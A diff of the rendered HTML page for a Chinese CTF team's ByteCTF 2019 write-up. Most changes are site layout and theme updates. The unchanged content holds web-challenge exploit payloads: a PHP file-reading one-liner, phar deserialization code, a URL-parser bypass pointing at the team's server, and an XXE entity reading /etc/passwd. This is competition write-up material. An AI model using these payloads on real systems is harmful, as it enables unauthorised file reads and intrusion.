@@ -12,7 +12,7 @@
  
 
 
-      <title>ByteCTF 2019 SU Write Up - </title>
+      <title>ByteCTF 2019 SU Write Up - su-team</title>
 
   <meta name="description" content="以下是我们 SU 本次 ByteCTF 的 writeup。">
   <meta name="author" content="SUer"/><script type="application/ld+json">
@@ -65,7 +65,7 @@
   "headline": "ByteCTF 2019 SU Write Up",
   "description" : "以下是我们 SU 本次 ByteCTF 的 writeup。\n",
   "inLanguage" : "en",
-  "wordCount":  2682 ,
+  "wordCount":  1865 ,
   "datePublished" : "2019-09-14T17:30:50\u002b08:00",
   "dateModified" : "2019-09-14T17:30:50\u002b08:00",
   "image" : "http:\/\/localhost:1313\/img\/SU.jpg",
@@ -101,55 +101,21 @@
   <link rel="alternate" href="http://localhost:1313/index.xml" type="application/rss+xml" title="su-team"><link rel="stylesheet" href="http://localhost:1313/css/katex.min.css" />
   <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/brands.min.css" />
   <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/fontawesome.min.css" />
-  <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/regular.min.css" />
   <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/solid.min.css" />
-  <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/svg.min.css" />
-  <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/svg-with-js.min.css" />
-  <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/v4-font-face.min.css" />
-  <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/v4-shims.min.css" />
-  <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/v5-font-face.min.css" />
-  <link rel="stylesheet" href="http://localhost:1313/css/bootstrap.min.css" /><link rel="stylesheet" href="http://localhost:1313/css/main.css" /><link rel="stylesheet" href="http://localhost:1313/css/fonts.css" /><link rel="stylesheet" href="http://localhost:1313/css/syntax.css" /><link rel="stylesheet" href="http://localhost:1313/css/codeblock.css?v=20260212-fix3" /><link rel="stylesheet" href="http://localhost:1313/css/photoswipe.min.css" />
-  <link rel="stylesheet" href="http://localhost:1313/css/photoswipe.default-skin.min.css" /><style>
- 
-.navbar-custom .avatar-container {
-  width: 58px;
-  height: 58px;
-  margin-top: -29px;  
-  left: 50%;
-  transform: translateX(-50%);
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  background: #fff;
-  border-radius: 50%;
-  box-shadow: 0 6px 18px rgba(0, 0, 0, 0.12);
-}
+  <link rel="stylesheet" href="http://localhost:1313/css/bootstrap.min.css" /><link rel="stylesheet" href="http://localhost:1313/css/main.css" /><link rel="stylesheet" href="http://localhost:1313/css/fonts.css" /><link rel="stylesheet" href="http://localhost:1313/css/syntax.css" /><link rel="stylesheet" href="http://localhost:1313/css/codeblock.css?v=20260322-1" /><link rel="stylesheet" href="http://localhost:1313/css/photoswipe.min.css" />
+  <link rel="stylesheet" href="http://localhost:1313/css/photoswipe.default-skin.min.css" /><script>
+  (function() {
+    var theme = "dark";
+    try {
+      theme = localStorage.getItem("theme") || "dark";
+    } catch (e) {
+      theme = "dark";
+    }
+    document.documentElement.setAttribute("data-theme", theme === "light" ? "light" : "dark");
+  })();
+</script>
+<link rel="stylesheet" href="/css/team-theme.css?v=20260322-6">
 
-.navbar-custom .avatar-container .avatar-img-border {
-  width: 100%;
-  height: 100%;
-  border-radius: 50%;
-  overflow: hidden;
-  margin: 0;
-  box-shadow: none;
-}
-
-.navbar-custom .avatar-container .avatar-img {
-  width: 100%;
-  height: 100%;
-  object-fit: cover;
-  border-radius: 50%;
-}
-
- 
-@media only screen and (min-width: 768px) {
-  .navbar-custom .avatar-container {
-    width: 72px;
-    height: 72px;
-    margin-top: -36px;  
-  }
-}
-</style>
   </head>
   <body>
     <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
@@ -161,12 +127,17 @@
         <span class="icon-bar"></span>
         <span class="icon-bar"></span>
       </button>
-      <a class="theme-toggle mobile-theme-toggle" href="javascript:void(0)" onclick="toggleTheme()" title="Toggle Theme">
-        <span class="sr-only">Toggle Theme</span>
-        <svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+
+      <a class="navbar-brand" href="/">
+        <span class="navbar-brand__title">su-team</span>
+        <span class="navbar-brand__meta">battle log</span>
+      </a>
+
+      <button type="button" class="theme-toggle mobile-theme-toggle hidden-sm hidden-md hidden-lg" onclick="toggleTheme()" aria-label="Toggle theme">
+        <svg class="theme-icon-moon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
           <path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"></path>
         </svg>
-        <svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <svg class="theme-icon-sun" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
           <circle cx="12" cy="12" r="5"></circle>
           <line x1="12" y1="1" x2="12" y2="3"></line>
           <line x1="12" y1="21" x2="12" y2="23"></line>
@@ -177,8 +148,7 @@
           <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
           <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
         </svg>
-      </a>
-      <a class="navbar-brand" href="http://localhost:1313/">su-team</a>
+      </button>
     </div>
 
     <div class="collapse navbar-collapse" id="main-navbar">
@@ -218,13 +188,12 @@
 
         
 
-        <li class="hidden-xs">
-          <a href="javascript:void(0)" class="theme-toggle" onclick="toggleTheme()" title="Toggle Theme">
-            <span class="sr-only">Toggle Theme</span>
-            <svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <li class="nav-theme-toggle hidden-xs">
+          <button type="button" class="theme-toggle" onclick="toggleTheme()" aria-label="Toggle theme">
+            <svg class="theme-icon-moon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
               <path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"></path>
             </svg>
-            <svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <svg class="theme-icon-sun" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
               <circle cx="12" cy="12" r="5"></circle>
               <line x1="12" y1="1" x2="12" y2="3"></line>
               <line x1="12" y1="21" x2="12" y2="23"></line>
@@ -235,8 +204,9 @@
               <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
               <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
             </svg>
-          </a>
+          </button>
         </li>
+
         
       </ul>
     </div>
@@ -245,93 +215,20 @@
       
       
     
-
   </div>
 </nav>
+
 <script>
-  (function() {
-    const storedTheme = localStorage.getItem("theme");
-    const prefersDark = window.matchMedia("(prefers-color-scheme: dark)").matches;
-    if (storedTheme === "dark" || (!storedTheme && prefersDark)) {
-      document.body.classList.add("dark-mode");
-    } else {
-      document.body.classList.remove("dark-mode");
-    }
-  })();
   function toggleTheme() {
-    const body = document.body;
-    body.classList.toggle("dark-mode");
-    if (body.classList.contains("dark-mode")) {
-      localStorage.setItem("theme", "dark");
-    } else {
-      localStorage.setItem("theme", "light");
-    }
+    var root = document.documentElement;
+    var current = root.getAttribute("data-theme") === "light" ? "light" : "dark";
+    var next = current === "dark" ? "light" : "dark";
+    root.setAttribute("data-theme", next);
+    try {
+      localStorage.setItem("theme", next);
+    } catch (e) {}
   }
 </script>
-<style>
-  .theme-toggle {
-    cursor: pointer;
-    padding: 15px;
-    display: flex;
-    align-items: center;
-  }
-  .mobile-theme-toggle {
-    float: right;
-    padding: 15px 10px;
-    margin-top: 2px;
-  }
-  @media (min-width: 768px) {
-    .mobile-theme-toggle {
-      display: none !important;
-    }
-  }
-  .theme-icon-moon,
-  .theme-icon-sun {
-    color: #777;
-    transition: color .3s, transform .3s;
-  }
-  .theme-toggle:hover .theme-icon-moon,
-  .theme-toggle:hover .theme-icon-sun {
-    color: #333;
-  }
-  .theme-icon-sun {
-    display: none;
-  }
-  .theme-icon-moon {
-    display: block;
-  }
-  body.dark-mode .theme-icon-sun {
-    display: block;
-    color: #000;
-  }
-  body.dark-mode .theme-icon-moon {
-    display: none;
-  }
-  body.dark-mode {
-    filter: none !important;
-    background-color: #1a1a1a !important;
-  }
-  body.dark-mode header,
-  body.dark-mode .container,
-  body.dark-mode footer {
-    filter: invert(1) hue-rotate(180deg);
-  }
-  body.dark-mode .navbar-custom {
-    background-color: #1a1a1a !important;
-    border-bottom: 1px solid #333;
-  }
-  body.dark-mode .navbar-custom .container-fluid {
-    filter: invert(1) hue-rotate(180deg);
-  }
-  body.dark-mode img,
-  body.dark-mode video,
-  body.dark-mode iframe,
-  body.dark-mode .avatar-img,
-  body.dark-mode .navbar-custom .avatar-container {
-    filter: invert(1) hue-rotate(180deg);
-  }
-</style>
-
 
 
 
@@ -417,10 +314,10 @@
   <i class="fas fa-calendar"></i>&nbsp;Posted on September 14, 2019
   
   
-    &nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;13&nbsp;min
+    &nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;9&nbsp;min
   
   
-    &nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;2682&nbsp;words
+    &nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;1865&nbsp;words
   
   
     
@@ -442,14 +339,15 @@
 
 
     
-<div class="container" role="main">
-  
-  <div class="row flex-row">
-    <div class="col-lg-3 col-lg-offset-0 col-md-3 col-md-offset-0 hidden-sm hidden-xs">
-      <div class="toc-sidebar">
-        <h4 class="toc-title">#<br>TABLE OF CONTENTS</h4>
-        <div class="toc-card">
-          
+
+
+<div class="container post-layout" role="main">
+  <div class="row flex-row post-layout__row">
+    
+      <div class="col-lg-3 col-md-3 hidden-sm hidden-xs">
+        <aside class="toc-sidebar">
+          <h4 class="toc-title">Table of Contents</h4>
+          <div class="toc-card">
             <nav id="TableOfContents">
   <ul>
     <li>
@@ -485,27 +383,21 @@
     </li>
   </ul>
 </nav>
-          
-        </div>
+          </div>
+        </aside>
       </div>
-    </div>
-    <div class="col-lg-9 col-md-9">
-  
-      <article role="main" class="blog-post">
-        <p>以下是我们 SU 本次 ByteCTF 的 writeup。</p>
+      <div class="col-lg-9 col-md-9 post-layout__main">
+    
+
+        <section class="article-shell">
+          <article role="main" class="blog-post">
+            <p>以下是我们 SU 本次 ByteCTF 的 writeup。</p>
 <h2 id="web">Web</h2>
 <h3 id="boring_code">boring_code</h3>
 <p>买了一个<code>aaaasdbaidu.com</code>的域名，即可绕过前面的 url 限制。<del>没错有钱你就可以打 CTF</del>
 然后在服务器上放<code>payload</code>就行了</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">readfile</span><span class="p">(</span><span class="nx">end</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">chr</span><span class="p">(</span><span class="nx">microtime</span><span class="p">(</span><span class="nx">chdir</span><span class="p">(</span><span class="nx">next</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">chr</span><span class="p">(</span><span class="nx">time</span><span class="p">())))))))));</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>dns 好了就直接爆破等时间就行了</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">readfile</span><span class="p">(</span><span class="nx">end</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">chr</span><span class="p">(</span><span class="nx">microtime</span><span class="p">(</span><span class="nx">chdir</span><span class="p">(</span><span class="nx">next</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">chr</span><span class="p">(</span><span class="nx">time</span><span class="p">())))))))));</span>
+</span></span></code></pre></div><p>dns 好了就直接爆破等时间就行了</p>
 <h3 id="ezcms">EzCMS</h3>
 <p>竟然抄了一下我们 suctf 的题&hellip;
 前面有一个 hash 长度拓展攻击，有原题，只不过长度为8位，hashdump跑一下就行了。
@@ -513,66 +405,7 @@
 <a href="https://www.anquanke.com/post/id/95896">Insomni&rsquo;hack Teaser 2018比赛Write Up：File Vault题目</a>
 然后随便上传一个 php 文件，删掉<code>.htaccess</code>之后就直接
 构造 phar 的代码：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span><span class="lnt">47
-</span><span class="lnt">48
-</span><span class="lnt">49
-</span><span class="lnt">50
-</span><span class="lnt">51
-</span><span class="lnt">52
-</span><span class="lnt">53
-</span><span class="lnt">54
-</span><span class="lnt">55
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
 </span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Check</span><span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$filename</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
@@ -627,36 +460,9 @@
 </span></span><span class="line"><span class="cl">    <span class="c1">//签名自动计算
 </span></span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="rss">rss</h3>
+</span></span></span></code></pre></div><h3 id="rss">rss</h3>
 <p><code>http://122.112.199.14:80,baidu.com:80/file</code> 逗号绕过 <code>url_parse</code>，vps 上放 xml ，可以任意读</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span>
 </span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE title [ &lt;!ELEMENT title ANY &gt;</span>
 </span></span><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34; &gt;</span>]&gt;
 </span></span><span class="line"><span class="cl"><span class="nt">&lt;rss</span> <span class="na">version=</span><span class="s">&#34;2.0&#34;</span> 
@@ -677,32 +483,9 @@
 </span></span><span class="line"><span class="cl">        <span class="nt">&lt;/item&gt;</span>
 </span></span><span class="line"><span class="cl">    <span class="nt">&lt;/channel&gt;</span>
 </span></span><span class="line"><span class="cl"><span class="nt">&lt;/rss&gt;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>php 伪协议读源码
+</span></span></code></pre></div><p>php 伪协议读源码
 index.php</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
 </span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;display_errors&#39;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;display_startup_erros&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="k">E_ALL</span><span class="p">);</span>
@@ -719,41 +502,8 @@ index.php</p>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>routes.php</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span></code></pre></div><p>routes.php</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="nx">Route</span><span class="o">::</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;index.php&#39;</span><span class="p">,</span><span class="k">function</span><span class="p">(){</span>
 </span></span><span class="line"><span class="cl">    <span class="nx">Index</span><span class="o">::</span><span class="na">createView</span><span class="p">(</span><span class="s1">&#39;Index&#39;</span><span class="p">);</span>
@@ -780,23 +530,8 @@ index.php</p>
 </span></span><span class="line"><span class="cl">      <span class="p">}</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">});</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Admin.php</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span><span class="lnt">9
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span></code></pre></div><p>Admin.php</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Admin</span> <span class="k">extends</span> <span class="nx">Controller</span><span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">sort</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span><span class="nv">$order</span><span class="p">){</span>
@@ -805,29 +540,8 @@ index.php</p>
 </span></span><span class="line"><span class="cl">        <span class="k">require_once</span> <span class="s1">&#39;./views/Admin.php&#39;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Fetch.php</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span></code></pre></div><p>Fetch.php</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Fetch</span> <span class="k">extends</span> <span class="nx">Controller</span><span class="p">{</span>
 </span></span><span class="line"><span class="cl">
@@ -842,57 +556,8 @@ index.php</p>
 </span></span><span class="line"><span class="cl">        <span class="k">require_once</span> <span class="s1">&#39;./views/Fetch.php&#39;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Rss.php</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span></code></pre></div><p>Rss.php</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Rss</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">
@@ -935,97 +600,8 @@ index.php</p>
 </span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$rss</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>View/Admin.php</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span><span class="lnt">47
-</span><span class="lnt">48
-</span><span class="lnt">49
-</span><span class="lnt">50
-</span><span class="lnt">51
-</span><span class="lnt">52
-</span><span class="lnt">53
-</span><span class="lnt">54
-</span><span class="lnt">55
-</span><span class="lnt">56
-</span><span class="lnt">57
-</span><span class="lnt">58
-</span><span class="lnt">59
-</span><span class="lnt">60
-</span><span class="lnt">61
-</span><span class="lnt">62
-</span><span class="lnt">63
-</span><span class="lnt">64
-</span><span class="lnt">65
-</span><span class="lnt">66
-</span><span class="lnt">67
-</span><span class="lnt">68
-</span><span class="lnt">69
-</span><span class="lnt">70
-</span><span class="lnt">71
-</span><span class="lnt">72
-</span><span class="lnt">73
-</span><span class="lnt">74
-</span><span class="lnt">75
-</span><span class="lnt">76
-</span><span class="lnt">77
-</span><span class="lnt">78
-</span><span class="lnt">79
-</span><span class="lnt">80
-</span><span class="lnt">81
-</span><span class="lnt">82
-</span><span class="lnt">83
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span></code></pre></div><p>View/Admin.php</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
 </span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;127.0.0.1&#39;</span><span class="p">){</span>
 </span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;;(&#39;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
@@ -1108,106 +684,12 @@ index.php</p>
